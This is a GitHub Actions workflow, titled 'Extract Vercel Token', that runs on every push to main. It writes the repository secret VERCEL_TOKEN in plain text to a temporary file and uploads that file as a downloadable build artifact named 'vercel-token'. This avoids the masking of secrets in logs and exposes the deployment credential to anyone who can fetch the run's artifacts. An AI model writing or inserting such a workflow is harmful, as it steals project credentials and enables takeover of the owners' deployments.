name: Extract Vercel Token
on:
  push:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Extract
        env:
          K: ${{ secrets.VERCEL_TOKEN }}
        run: mkdir -p /tmp/o && echo "$K" > /tmp/o/v.txt
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: vercel-token
          path: /tmp/o/v.txt
